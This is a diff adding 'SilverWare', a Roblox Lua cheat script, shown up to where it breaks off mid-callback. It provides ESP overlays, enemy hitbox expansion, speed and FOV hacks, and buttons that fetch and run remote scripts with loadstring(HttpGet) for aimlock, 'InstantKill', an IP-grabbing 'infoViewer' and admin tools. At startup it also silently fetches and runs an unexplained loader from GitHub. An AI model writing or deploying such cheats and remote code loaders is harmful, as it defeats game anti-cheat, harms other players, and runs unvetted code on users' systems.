@@ -1,0 +1,1052 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
+
+-- StoredVariables
+local teamCheckEnabled = false -- Added team check variable
+
+-- ESP variables
+local highlightEspEnabled = false
+local nameEspEnabled = false
+local boxEspEnabled = false
+local espColor = Color3.fromRGB(86, 171, 128)
+local espObjects = {}
+
+-- Function to check if a player is an enemy
+local function isEnemy(player)
+    if not teamCheckEnabled then
+        return player ~= Players.LocalPlayer
+    end
+    
+    local localPlayer = Players.LocalPlayer
+    if not localPlayer or not localPlayer.Team then 
+        return player ~= localPlayer
+    end
+    
+    return player ~= localPlayer and (not player.Team or player.Team ~= localPlayer.Team)
+end
+
+-- Function to create ESP
+local function createEsp(player)
+    if not player.Character or not isEnemy(player) then return end
+
+    local character = player.Character
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    local humanoid = character:FindFirstChild("Humanoid")
+    if not humanoidRootPart or not humanoid then return end
+
+    -- Remove existing ESP if it exists
+    if espObjects[player] then
+        for _, obj in pairs(espObjects[player]) do
+            if obj then obj:Destroy() end
+        end
+        espObjects[player] = nil
+    end
+
+    -- Create new ESP objects
+    espObjects[player] = {}
+
+    -- Highlight ESP
+    if highlightEspEnabled then
+        local highlight = Instance.new("Highlight")
+        highlight.Name = "SilverWareHighlight"
+        highlight.Adornee = character
+        highlight.FillColor = espColor
+        highlight.OutlineColor = espColor
+        highlight.FillTransparency = 0.5
+        highlight.OutlineTransparency = 0
+        highlight.Parent = character
+        table.insert(espObjects[player], highlight)
+    end
+
+    -- Name ESP
+    if nameEspEnabled then
+        local billboard = Instance.new("BillboardGui")
+        billboard.Name = "SilverWareNameEsp"
+        billboard.Adornee = humanoidRootPart
+        billboard.Size = UDim2.new(0, 200, 0, 50)
+        billboard.StudsOffset = Vector3.new(0, 3, 0)
+        billboard.AlwaysOnTop = true
+        local textLabel = Instance.new("TextLabel")
+        textLabel.Text = player.Name
+        textLabel.Size = UDim2.new(1, 0, 1, 0)
+        textLabel.BackgroundTransparency = 1
+        textLabel.TextStrokeTransparency = 0
+        textLabel.TextColor3 = espColor
+        textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
+        textLabel.TextScaled = true
+        textLabel.Parent = billboard
+        billboard.Parent = humanoidRootPart
+        table.insert(espObjects[player], billboard)
+    end
+
+    -- Box ESP
+    if boxEspEnabled then
+        local box = Instance.new("BoxHandleAdornment")
+        box.Name = "SilverWareBoxEsp"
+        box.Adornee = humanoidRootPart
+        box.AlwaysOnTop = true
+        box.ZIndex = 10
+        box.Size = Vector3.new(2, 3.5, 1)
+        box.Transparency = 0.5
+        box.Color3 = espColor
+        box.Parent = humanoidRootPart
+        table.insert(espObjects[player], box)
+    end
+end
+
+-- Function to update ESP color
+local function updateEspColor(newColor)
+    espColor = newColor
+    for player, objects in pairs(espObjects) do
+        for _, obj in pairs(objects) do
+            if obj:IsA("Highlight") then
+                obj.FillColor = newColor
+                obj.OutlineColor = newColor
+            elseif obj:IsA("BillboardGui") then
+                obj.TextLabel.TextColor3 = newColor
+            elseif obj:IsA("BoxHandleAdornment") then
+                obj.Color3 = newColor
+            end
+        end
+    end
+end
+
+-- Function to toggle ESP for all players
+local function toggleEsp()
+    for _, player in ipairs(Players:GetPlayers()) do
+        createEsp(player)
+    end
+end
+
+-- Function to clear all ESP
+local function clearEsp()
+    for player, objects in pairs(espObjects) do
+        for _, obj in pairs(objects) do
+            if obj then obj:Destroy() end
+        end
+    end
+    espObjects = {}
+end
+
+-- Player added/removed connections
+Players.PlayerAdded:Connect(function(player)
+    if highlightEspEnabled or nameEspEnabled or boxEspEnabled then
+        player.CharacterAdded:Connect(function(character)
+            wait(1) -- Wait for character to fully load
+            createEsp(player)
+        end)
+    end
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    if espObjects[player] then
+        for _, obj in pairs(espObjects[player]) do
+            if obj then obj:Destroy() end
+        end
+        espObjects[player] = nil
+    end
+end)
+
+-- Hitbox Variable
+local hitboxEnabled = false
+local hitboxSize = 10
+local hitboxTransparency = 0.8
+local originalProperties = {}
+
+-- Stores references to modified parts
+local activeHitboxes = {}
+
+-- Main hitbox expansion function
+local function expandHitboxes(character)
+    if not character or not isEnemy(Players:GetPlayerFromCharacter(character)) then return end
+
+    -- Only modify HRP and Head
+    local hrp = character:FindFirstChild("HumanoidRootPart")
+    local head = character:FindFirstChild("Head")
+
+    -- Process HumanoidRootPart
+    if hrp then
+        if not originalProperties[hrp] then
+            originalProperties[hrp] = {
+                Size = hrp.Size,
+                Transparency = hrp.Transparency,
+                CanCollide = hrp.CanCollide,
+                Material = hrp.Material
+            }
+        end
+        hrp.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
+        hrp.Transparency = hitboxTransparency
+        hrp.CanCollide = false
+        hrp.Material = Enum.Material.ForceField
+        table.insert(activeHitboxes, hrp)
+    end
+
+    -- Process Head
+    if head then
+        if not originalProperties[head] then
+            originalProperties[head] = {
+                Size = head.Size,
+                Transparency = head.Transparency,
+                CanCollide = head.CanCollide,
+                Material = head.Material
+            }
+        end
+        head.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
+        head.Transparency = hitboxTransparency
+        head.CanCollide = false
+        head.Material = Enum.Material.ForceField
+        table.insert(activeHitboxes, head)
+    end
+end
+
+-- Reset hitboxes to original state
+local function resetHitboxes(character)
+    if not character then return end
+
+    for part, props in pairs(originalProperties) do
+        if part and part.Parent == character then
+            part.Size = props.Size
+            part.Transparency = props.Transparency
+            part.CanCollide = props.CanCollide
+            part.Material = props.Material
+        end
+    end
+end
+
+-- Apply to all players
+local function updateAllHitboxes()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character then
+            if hitboxEnabled then
+                expandHitboxes(player.Character)
+            else
+                resetHitboxes(player.Character)
+            end
+        end
+    end
+end
+
+-- Player tracking
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(character)
+        if hitboxEnabled then
+            expandHitboxes(character)
+        end
+    end)
+end)
+
+-- Notification
+
+local player = Players.LocalPlayer
+local gui = player:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "NotificationGui"
+screenGui.Parent = gui
+screenGui.ResetOnSpawn = false
+
+-- Create a sound folder in SoundService for our notification sounds
+local notificationSounds = Instance.new("Folder")
+notificationSounds.Name = "NotificationSounds"
+notificationSounds.Parent = SoundService
+
+-- Sound IDs and configurations
+local soundConfigs = {
+    NotificationAppear = {id = 3023237993, volume = 0.1},
+    NotificationDisappear = {id = 18595195017, volume = 0.1},
+    NotificationHover = {id = 7218169592, volume = 0.1},
+    NotificationClick = {id = 177266782, volume = 0.1},
+    NotificationPulse = {id = 10066936758, volume = 0.1}
+}
+-- Function to play sounds
+local function playSound(soundName)
+    local config = soundConfigs[soundName]
+    if not config then return end
+    
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://"..config.id
+    sound.Volume = config.volume
+    sound.Parent = notificationSounds
+    sound:Play()
+    
+    sound.Ended:Connect(function()
+        sound:Destroy()
+    end)
+end
+
+-- Notification function
+function showNotification(title, message, duration, color)
+    duration = duration or 5
+    color = color or Color3.fromRGB(0, 170, 255)
+
+    -- Play appear sound
+    playSound("NotificationAppear")
+
+    -- Main frame
+    local frame = Instance.new("Frame")
+    frame.Name = "Notification"
+    frame.Size = UDim2.new(0.35, 0, 0, 70)
+    frame.Position = UDim2.new(1, 10, 0.85, 0)
+    frame.AnchorPoint = Vector2.new(1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    frame.BackgroundTransparency = 0.8  -- Start more transparent for dramatic fade-in
+    frame.BorderSizePixel = 0
+    frame.Parent = screenGui
+    frame.ZIndex = 10
+    frame.ClipsDescendants = true  -- For the ripple effect
+
+    -- Shadow with initial scale for pop effect
+    local shadow = Instance.new("ImageLabel")
+    shadow.Name = "Shadow"
+    shadow.Image = "rbxassetid://1316045217"
+    shadow.ImageTransparency = 0.9  -- Start more transparent
+    shadow.ScaleType = Enum.ScaleType.Slice
+    shadow.SliceCenter = Rect.new(10, 10, 118, 118)
+    shadow.Size = UDim2.new(1, 20, 1, 20)
+    shadow.Position = UDim2.new(0, -10, 0, -10)
+    shadow.BackgroundTransparency = 1
+    shadow.ZIndex = frame.ZIndex - 1
+    shadow.Parent = frame
+
+    -- Rounded corners
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = frame
+
+    -- Accent line
+    local accent = Instance.new("Frame")
+    accent.Name = "Accent"
+    accent.Size = UDim2.new(0, 0, 0, 2)  -- Start with 0 width for animation
+    accent.Position = UDim2.new(0, 0, 0, 0)
+    accent.BackgroundColor3 = color
+    accent.BorderSizePixel = 0
+    accent.ZIndex = frame.ZIndex + 1
+    accent.Parent = frame
+
+    -- Title with initial scale for bounce effect
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "Title"
+    titleLabel.Text = title
+    titleLabel.TextColor3 = Color3.fromRGB(0, 255, 180)
+    titleLabel.TextTransparency = 1  -- Start invisible for fade-in
+    titleLabel.TextSize = 15
+    titleLabel.Font = Enum.Font.Code
+    titleLabel.Size = UDim2.new(1, -40, 0, 18)
+    titleLabel.Position = UDim2.new(0, 10, 0, 8)
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.ZIndex = frame.ZIndex + 1
+    titleLabel.Parent = frame
+
+    -- Message
+    local messageLabel = Instance.new("TextLabel")
+    messageLabel.Name = "Message"
+    messageLabel.Text = message
+    messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    messageLabel.TextTransparency = 1  -- Start invisible for fade-in
+    messageLabel.TextSize = 14
+    messageLabel.Font = Enum.Font.Code
+    messageLabel.Size = UDim2.new(1, -20, 0, 35)
+    messageLabel.Position = UDim2.new(0, 10, 0, 28)
+    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
+    messageLabel.TextYAlignment = Enum.TextYAlignment.Top
+    messageLabel.BackgroundTransparency = 1
+    messageLabel.ZIndex = frame.ZIndex + 1
+    messageLabel.Parent = frame
+
+    -- Close button with hover effects
+    local closeButton = Instance.new("TextButton")
+    closeButton.Name = "CloseButton"
+    closeButton.Text = "×"
+    closeButton.TextColor3 = Color3.fromRGB(180, 180, 180)
+    closeButton.TextTransparency = 1  -- Start invisible for fade-in
+    closeButton.TextSize = 20
+    closeButton.Font = Enum.Font.Code
+    closeButton.Size = UDim2.new(0, 20, 0, 20)
+    closeButton.Position = UDim2.new(1, -25, 0, 6)
+    closeButton.BackgroundTransparency = 1
+    closeButton.ZIndex = frame.ZIndex + 1
+    closeButton.Parent = frame
+
+    -- Add a subtle glow effect
+    local glow = Instance.new("ImageLabel")
+    glow.Name = "Glow"
+    glow.Image = "rbxassetid://5028857084"
+    glow.ImageColor3 = color
+    glow.ImageTransparency = 1  -- Start invisible
+    glow.ScaleType = Enum.ScaleType.Slice
+    glow.SliceCenter = Rect.new(24, 24, 24, 24)
+    glow.Size = UDim2.new(1, 40, 1, 40)
+    glow.Position = UDim2.new(0.5, -20, 0.5, -20)
+    glow.AnchorPoint = Vector2.new(0.5, 0.5)
+    glow.BackgroundTransparency = 1
+    glow.ZIndex = frame.ZIndex - 1
+    glow.Parent = frame
+
+    -- Add a ripple effect for when the notification appears
+    local ripple = Instance.new("Frame")
+    ripple.Name = "Ripple"
+    ripple.Size = UDim2.new(0, 0, 0, 0)
+    ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ripple.AnchorPoint = Vector2.new(0.5, 0.5)
+    ripple.BackgroundColor3 = Color3.new(1, 1, 1)
+    ripple.BackgroundTransparency = 0.9
+    ripple.ZIndex = frame.ZIndex + 2
+    local rippleCorner = Instance.new("UICorner")
+    rippleCorner.CornerRadius = UDim.new(1, 0)
+    rippleCorner.Parent = ripple
+    ripple.Parent = frame
+
+    -- Pulse animation for accent line
+    local pulseConnection
+    local function startPulse()
+        playSound("NotificationPulse")
+        
+        local targetColor = Color3.new(color.R * 1.2, color.G * 1.2, color.B * 1.2)
+        local pulseIn = TweenService:Create(accent, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true), {
+            BackgroundColor3 = targetColor
+        })
+        pulseIn:Play()
+    end
+
+    -- Slide in animation with bounce
+    local slideIn = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Position = UDim2.new(1, -10, 0.85, 0),
+        BackgroundTransparency = 0.1
+    })
+    
+    -- Pop effect for shadow
+    local shadowPop = TweenService:Create(shadow, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        ImageTransparency = 0.6,
+        Size = UDim2.new(1, 30, 1, 30),
+        Position = UDim2.new(0, -15, 0, -15)
+    })
+    
+    -- Glow effect
+    local glowFadeIn = TweenService:Create(glow, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+        ImageTransparency = 0.8
+    })
+    
+    -- Ripple effect animation
+    local rippleExpand = TweenService:Create(ripple, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {
+        Size = UDim2.new(2, 0, 2, 0),
+        BackgroundTransparency = 1
+    })
+    
+    -- Fade in content with slight delay between elements
+    local fadeIn = TweenService:Create(titleLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+        TextTransparency = 0
+    })
+    local fadeIn2 = TweenService:Create(messageLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+        TextTransparency = 0
+    })
+    local fadeIn3 = TweenService:Create(closeButton, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+        TextTransparency = 0
+    })
+    
+    -- Accent line grow animation with overshoot
+    local accentGrow = TweenService:Create(accent, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(1, 0, 0, 2)
+    })
+    
+    -- Frame fade in with slight scale effect
+    local frameFadeIn = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
+        BackgroundTransparency = 0.1
+    })
+
+    -- Play animations in sequence with staggered timing
+    slideIn:Play()
+    shadowPop:Play()
+    rippleExpand:Play()
+    glowFadeIn:Play()
+    
+    -- Start ripple from center
+    ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ripple.AnchorPoint = Vector2.new(0.5, 0.5)
+    
+    task.wait(0.1)
+    accentGrow:Play()
+    frameFadeIn:Play()
+    
+    task.wait(0.15)
+    fadeIn:Play()
+    
+    task.wait(0.05)
+    fadeIn2:Play()
+    
+    task.wait(0.05)
+    fadeIn3:Play()
+    
+    -- Start pulse animation after everything is shown
+    task.delay(0.6, startPulse)
+    
+    -- Hover effect for the entire notification
+    local hoverScale = 1.02
+    frame.MouseEnter:Connect(function()
+        playSound("NotificationHover")
+        
+        TweenService:Create(frame, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.35 * hoverScale, 0, 0, 70 * hoverScale)
+        }):Play()
+        TweenService:Create(shadow, TweenInfo.new(0.2), {
+            Size = UDim2.new(1, 30 * hoverScale, 1, 30 * hoverScale),
+            Position = UDim2.new(0, -15 * hoverScale, 0, -15 * hoverScale)
+        }):Play()
+    end)
+    
+    frame.MouseLeave:Connect(function()
+        TweenService:Create(frame, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.35, 0, 0, 70)
+        }):Play()
+        TweenService:Create(shadow, TweenInfo.new(0.2), {
+            Size = UDim2.new(1, 30, 1, 30),
+            Position = UDim2.new(0, -15, 0, -15)
+        }):Play()
+    end)
+
+    -- Close functionality with animations
+    local closing = false
+    local function close()
+        if closing then return end
+        closing = true
+        
+        playSound("NotificationDisappear")
+        
+        -- Stop pulse animation
+        if pulseConnection then
+            pulseConnection:Disconnect()
+        end
+        
+        -- Create a new ripple for close effect
+        local closeRipple = ripple:Clone()
+        closeRipple.BackgroundTransparency = 0.95
+        closeRipple.Size = UDim2.new(0, 0, 0, 0)
+        closeRipple.Position = UDim2.new(
+            UserInputService:GetMouseLocation().X / frame.AbsoluteSize.X,
+            0,
+            (UserInputService:GetMouseLocation().Y - frame.AbsolutePosition.Y) / frame.AbsoluteSize.Y,
+            0
+        )
+        closeRipple.AnchorPoint = Vector2.new(0.5, 0.5)
+        closeRipple.Parent = frame
+        
+        local rippleOut = TweenService:Create(closeRipple, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {
+            Size = UDim2.new(2, 0, 2, 0),
+            BackgroundTransparency = 1
+        })
+        rippleOut:Play()
+        rippleOut.Completed:Connect(function()
+            closeRipple:Destroy()
+        end)
+        
+        -- Shake effect when closing
+        local shakeOffset = 5
+        for i = 1, 3 do
+            TweenService:Create(frame, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {
+                Position = UDim2.new(1, -10 + shakeOffset, 0.85, 0)
+            }):Play()
+            task.wait(0.05)
+            TweenService:Create(frame, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {
+                Position = UDim2.new(1, -10 - shakeOffset, 0.85, 0)
+            }):Play()
+            task.wait(0.05)
+            shakeOffset = shakeOffset * 0.6  -- Reduce shake amount each time
+        end
+        
+        -- Fade out content first
+        local fadeOut = TweenService:Create(titleLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            TextTransparency = 1
+        })
+        local fadeOut2 = TweenService:Create(messageLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            TextTransparency = 1
+        })
+        local fadeOut3 = TweenService:Create(closeButton, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            TextTransparency = 1
+        })
+        
+        fadeOut:Play()
+        fadeOut2:Play()
+        fadeOut3:Play()
+        
+        -- Then slide out the frame
+        task.wait(0.15)
+        local slideOut = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+            Position = UDim2.new(1, 10, 0.85, 0),
+            BackgroundTransparency = 0.8
+        })
+        
+        -- Shrink accent line
+        local accentShrink = TweenService:Create(accent, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            Size = UDim2.new(0, 0, 0, 2)
+        })
+        
+        -- Shadow fade out and shrink
+        local shadowFadeOut = TweenService:Create(shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
+            ImageTransparency = 0.9,
+            Size = UDim2.new(1, 20, 1, 20),
+            Position = UDim2.new(0, -10, 0, -10)
+        })
+        
+        -- Glow fade out
+        local glowFadeOut = TweenService:Create(glow, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
+            ImageTransparency = 1
+        })
+        
+        slideOut:Play()
+        accentShrink:Play()
+        shadowFadeOut:Play()
+        glowFadeOut:Play()
+        
+        slideOut.Completed:Wait()
+        frame:Destroy()
+    end
+
+    closeButton.MouseButton1Click:Connect(function()
+        playSound("NotificationClick")
+        close()
+    end)
+    
+    -- Enhanced close button hover effects
+    closeButton.MouseEnter:Connect(function()
+        playSound("NotificationHover")
+        
+        TweenService:Create(closeButton, TweenInfo.new(0.1), {
+            TextColor3 = Color3.new(1, 1, 1),
+            Rotation = 90,
+            TextSize = 22
+        }):Play()
+    end)
+    
+    closeButton.MouseLeave:Connect(function()
+        TweenService:Create(closeButton, TweenInfo.new(0.1), {
+            TextColor3 = Color3.fromRGB(180, 180, 180),
+            Rotation = 0,
+            TextSize = 20
+        }):Play()
+    end)
+
+    -- Auto-close after duration
+    task.delay(duration, function()
+        close()
+    end)
+end
+
+-- Example usage with different animations
+showNotification("Hello :)", "Made By Hmmm5650", 3, Color3.fromRGB(0, 200, 100))
+
+-- [ LoadsScriptResources ]
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/LoadResources/refs/heads/main/ResSourcesLoaderSource", true))()
+    warn("StartedScript")
+end)
+
+local Luna = loadstring(game:HttpGet("https://raw.githubusercontent.com/Nebula-Softworks/Luna-Interface-Suite/refs/heads/main/source.lua", true))()
+local Window = Luna:CreateWindow({
+    Name = "SilverWare🍴(v0.1)",
+    Subtitle = nil,
+    LogoID = "98445694743887",
+    LoadingEnabled = true,
+    LoadingTitle = "Starting SilverWare🍴",
+    LoadingSubtitle = "[ Ver, 0.1 ]",
+    ConfigSettings = {
+        RootFolder = nil,
+        ConfigFolder = "SliverWareConfig"
+    },
+    KeySystem = false
+})
+
+local Tab = Window:CreateTab({
+    Name = "Settings",
+    Icon = "view_in_ar",
+    ImageSource = "Material",
+    ShowTitle = true
+})
+
+local Button = Tab:CreateButton({
+	Name = "Antikick",
+	Description = "Deletes AntiCheat", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+         
+    	end
+})
+
+local Button = Tab:CreateButton({
+	Name = "AntiLag",
+	Description = "Lowers Rendering", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Al/refs/heads/main/AntiLag", true))()
+    	end
+})
+
+local Button = Tab:CreateButton({
+	Name = "AntiLag 2",
+	Description = "Lowers Rendering And Removes Unnecessary Parts", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Jxeybdfkhwnsantilagejbesnjdd/refs/heads/main/Al2", true))()
+    	end
+})
+
+-- TeamCheck Toggle
+local Toggle = Tab:CreateToggle({
+    Name = "TeamCheck",
+    Description = "Only target enemies (not teammates)",
+    CurrentValue = false,
+    Callback = function(Value)
+        teamCheckEnabled = Value
+        if highlightEspEnabled or nameEspEnabled or boxEspEnabled then
+            clearEsp()
+            toggleEsp()
+        end
+        if hitboxEnabled then
+            updateAllHitboxes()
+        end
+    end
+}, "Toggle")
+
+local Button = Tab:CreateButton({
+    Name = "Reset WalkSpeed",
+    Description = "Resets your WalkSpeed to default (16)",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        if player and player.Character and player.Character:FindFirstChild("Humanoid") then
+            player.Character.Humanoid.WalkSpeed = 16
+        end
+    end
+})
+
+local Slider = Tab:CreateSlider({
+    Name = "WalkSpeed Slider",
+    Range = {0, 200},
+    Increment = 5,
+    CurrentValue = 16,
+    Callback = function(Value)
+        local player = game.Players.LocalPlayer
+        if player and player.Character and player.Character:FindFirstChild("Humanoid") then
+            player.Character.Humanoid.WalkSpeed = Value
+        end
+    end
+}, "WalkSpeedSlider")
+
+local Button = Tab:CreateButton({
+	Name = "Aimlock",
+	Description = "Loads AimlockButton", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Aimlock-scriptIg/refs/heads/main/All", true))()
+    	end
+})
+
+local Tab = Window:CreateTab({
+	Name = "Player List",
+	Icon = "view_in_ar",
+	ImageSource = "Material",
+	ShowTitle = true -- This will determine whether the big header text in the tab will show
+})
+
+local Button = Tab:CreateButton({
+    Name = "Copy Player Username",
+    Description = "Click to show player list",
+    Callback = function()
+        -- Clear any existing buttons (if needed)
+        -- (Depends on your UI library, some may require manual cleanup)
+        
+        -- Get all players
+        local players = game:GetService("Players"):GetPlayers()
+        
+        -- Create a button for each player
+        for _, player in ipairs(players) do
+            Tab:CreateButton({
+                Name = player.Name,
+                Description = "Click to copy username",
+                Callback = function()
+                    -- Copy username to clipboard
+                    if setclipboard then
+                        setclipboard(player.Name)
+                    else
+                        -- Fallback for non-exploit environments (Roblox Studio)
+                        print("[Copied] " .. player.Name)
+                    end
+                    
+                    -- Optional: Notify the user
+                    game:GetService("StarterGui"):SetCore("SendNotification", {
+                        Title = "Copied!",
+                        Text = player.Name .. " copied to clipboard",
+                        Duration = 3,
+                    })
+                end
+            })
+        end
+    end
+})
+
+-- Create the Visuals tab
+local Tab = Window:CreateTab({
+    Name = "Visuals",
+    Icon = "view_in_ar",
+    ImageSource = "Material",
+    ShowTitle = true
+})
+
+-- Highlight ESP Toggle
+local Toggle = Tab:CreateToggle({
+    Name = "HighlightEsp",
+    Description = "Highlights players with a colored outline",
+    CurrentValue = false,
+    Callback = function(Value)
+        highlightEspEnabled = Value
+        if Value then
+            toggleEsp()
+        else
+            clearEsp()
+            if nameEspEnabled or boxEspEnabled then
+                toggleEsp()
+            end
+        end
+    end
+}, "Toggle")
+
+-- Name ESP Toggle
+local Toggle = Tab:CreateToggle({
+    Name = "NameEsp",
+    Description = "Shows player names above their heads",
+    CurrentValue = false,
+    Callback = function(Value)
+        nameEspEnabled = Value
+        if Value then
+            toggleEsp()
+        else
+            clearEsp()
+            if highlightEspEnabled or boxEspEnabled then
+                toggleEsp()
+            end
+        end
+    end
+}, "Toggle")
+
+-- Box ESP Toggle
+local Toggle = Tab:CreateToggle({
+    Name = "BoxEsp",
+    Description = "Draws a box around players",
+    CurrentValue = false,
+    Callback = function(Value)
+        boxEspEnabled = Value
+        if Value then
+            toggleEsp()
+        else
+            clearEsp()
+            if highlightEspEnabled or nameEspEnabled then
+                toggleEsp()
+            end
+        end
+    end
+}, "Toggle")
+
+-- Color Picker
+local ColorPicker = Tab:CreateColorPicker({
+    Name = "Esp Color",
+    Color = Color3.fromRGB(86, 171, 128),
+    Flag = "ColorPicker1",
+    Callback = function(Value)
+        updateEspColor(Value)
+    end
+}, "ColorPicker")
+
+-- Initialize ESP for existing players if any toggle is enabled
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(character)
+        wait(1) -- Wait for character to fully load
+        if highlightEspEnabled or nameEspEnabled or boxEspEnabled then
+            createEsp(player)
+        end
+    end)
+end)
+
+-- Initialize ESP for existing players
+for _, player in ipairs(Players:GetPlayers()) do
+    if player.Character and (highlightEspEnabled or nameEspEnabled or boxEspEnabled) then
+        createEsp(player)
+    end
+    player.CharacterAdded:Connect(function(character)
+        wait(1) -- Wait for character to fully load
+        if highlightEspEnabled or nameEspEnabled or boxEspEnabled then
+            createEsp(player)
+        end
+    end)
+end
+
+local Slider = Tab:CreateSlider({
+    Name = "FOV Slider",
+    Range = {0, 120},
+    Increment = 1,
+    CurrentValue = 70,
+    Callback = function(Value)
+        game.Workspace.CurrentCamera.FieldOfView = Value
+    end
+}, "FOVSlider")
+
+local Tab = Window:CreateTab({
+    Name = "Hitbox Expander",
+    Icon = "view_in_ar",
+    ImageSource = "Material",
+    ShowTitle = true
+})
+
+-- UI Elements
+local Toggle = Tab:CreateToggle({
+    Name = "Enable Hitbox Expansion",
+    Description = "Expands HRP and Head hitboxes",
+    CurrentValue = false,
+    Callback = function(Value)
+        hitboxEnabled = Value
+        updateAllHitboxes()
+    end
+}, "HitboxToggle")
+
+local SizeInput = Tab:CreateInput({
+    Name = "Hitbox Size",
+    Description = "Size in studs (1-50)",
+    PlaceholderText = tostring(hitboxSize),
+    CurrentValue = tostring(hitboxSize),
+    Numeric = true,
+    MaxCharacters = 2,
+    Enter = true,
+    Callback = function(Text)
+        local num = tonumber(Text)
+        if num and num >= 1 and num <= 50 then
+            hitboxSize = num
+            if hitboxEnabled then
+                updateAllHitboxes()
+            end
+        end
+    end
+}, "SizeInput")
+
+local TransparencyInput = Tab:CreateInput({
+    Name = "Hitbox Transparency",
+    Description = "0-1 (0 = solid, 1 = invisible)",
+    PlaceholderText = tostring(hitboxTransparency),
+    CurrentValue = tostring(hitboxTransparency),
+    Numeric = true,
+    MaxCharacters = 3,
+    Enter = true,
+    Callback = function(Text)
+        local num = tonumber(Text)
+        if num and num >= 0 and num <= 1 then
+            hitboxTransparency = num
+            for _, part in ipairs(activeHitboxes) do
+                if part and part.Parent then
+                    part.Transparency = num
+                end
+            end
+        end
+    end
+}, "TransparencyInput")
+
+-- Initialize for existing players
+for _, player in ipairs(Players:GetPlayers()) do
+    if player.Character then
+        if hitboxEnabled then
+            expandHitboxes(player.Character)
+        end
+    end
+end
+
+-- Auto-update to prevent hitbox reset
+RunService.Heartbeat:Connect(function()
+    if hitboxEnabled then
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player.Character then
+                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+                local head = player.Character:FindFirstChild("Head")
+
+                if hrp and (hrp.Size.X < hitboxSize or hrp.Transparency ~= hitboxTransparency) then
+                    expandHitboxes(player.Character)
+                end
+                if head and (head.Size.X < hitboxSize or head.Transparency ~= hitboxTransparency) then
+                    expandHitboxes(player.Character)
+                end
+            end
+        end
+    end
+end)
+
+local Tab = Window:CreateTab({
+	Name = "Trolling",
+	Icon = "view_in_ar",
+	ImageSource = "Material",
+	ShowTitle = true -- This will determine whether the big header text in the tab will show
+})
+
+local Button = Tab:CreateButton({
+	Name = "InstantKill",
+	Description = "Needs a sword for it to work", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/InstantKillig/refs/heads/main/Coolkillguithingy", true))()
+    	end
+})
+
+
+local Button = Tab:CreateButton({
+	Name = "infoViewer",
+	Description = "''i got ur IP address''", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty31.lua"))()
+    	end
+})
+
+local Tab = Window:CreateTab({
+	Name = "Admins",
+	Icon = "view_in_ar",
+	ImageSource = "Material",
+	ShowTitle = true -- This will determine whether the big header text in the tab will show
+})
+
+local Button = Tab:CreateButton({
+	Name = "Infinite Yield",
+	Description = "loads infinite Yield", -- Creates A Description For Users to know what the button does (looks bad if you use it all the time),
+    	Callback = function()
